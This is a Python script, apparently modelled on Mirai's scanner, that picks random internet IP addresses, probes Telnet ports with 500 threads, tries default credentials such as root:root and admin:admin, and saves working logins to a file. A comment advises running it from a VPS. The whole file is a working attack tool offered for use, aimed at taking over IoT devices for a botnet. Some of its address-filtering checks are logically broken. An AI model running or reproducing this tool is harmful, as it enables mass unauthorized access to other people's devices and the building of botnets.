import xtelnet,socket
from threading import Thread
from time import sleep
from random import randint
timeout=5
threads=500
stop=False
telnet_results='telnet.txt'
def create_file(w):
    with open(w ,"a+") as f:
     pass
create_file(telnet_results)
def getip():
 '''
   this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce.
'''
 d=[3,6,7,10,11,15,16,21,22,23,26,28,29,30,33,55,56,127,214,215]
 f=[100,169,172,198]
 while True:
  o1=randint(1,253)
  o2=randint(0,254)
  if (o1 not in d):
   if o1 in f:
    if ((o1==192)and(o2!=168)):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
    if ((o2==172)and((o2<=16)and(o2>=32))):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
    if((o1==100)and(o2!=64)):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
    if((o1==169)and (o2!=254)):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
    if((o1==198)and(o2!=18)):
     return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
   else:
    return '{}.{}.{}.{}'.format(o1,o2,randint(0,255),randint(0,255))
def write_file(w):
    with open('telnet.txt',"a+") as f:
        f.write(w+'\n')
        return   

class iott(Thread):
 def run(self):
  while (stop!=True):
   ip=getip()
   for port in [23,2323,9000,9001]:
    i=False
    if stop==True:
        break
    try:
     so=socket.socket()
     so.settimeout(timeout)
     so.connect((ip,port))
     so.close()
     i=True
    except: 
     pass
    if i==True: #Better Use a VPS LOL My Mirai bruteforce user:pass
     for x in ['root:','root:root','admin:admin','root:pass']:
      try:
       #print('\033[92m[*]Trying: {}:{} {}:{}'.format(ip,port,x.split(':')[0],x.split(':')[1]))
       t=xtelnet.session()
       t.connect(ip,p=port,username=x.split(':')[0],password=x.split(':')[1],timeout=timeout)
       print(ip+":"+str(port)+":"+x.split(':')[0]+":"+x.split(':')[1])
       write_file(ip+":"+str(port)+":"+x.split(':')[0]+":"+x.split(':')[1])
       t.close()
       break
      except Exception as e:
       print("\033[91m[-]Failed: "+ip+":"+str(port)+":"+x.split(':')[0]+":"+x.split(':')[1]+" ==>"+str(e))
       if " Authentication Failed" not in str(e):
           break
def scan():
 global stop
 stop=False
 thr=[]
 for x in range(threads):
  try:
   t=iott().start()
   thr.append(t)
  except:
   pass
 while (stop!=True):
  try:
    sleep(.1)
  except KeyboardInterrupt:
    stop=True
    break
 for x in thr:
    try:
      x.join(1)
    except Exception as e:
      pass
    del x
scan()
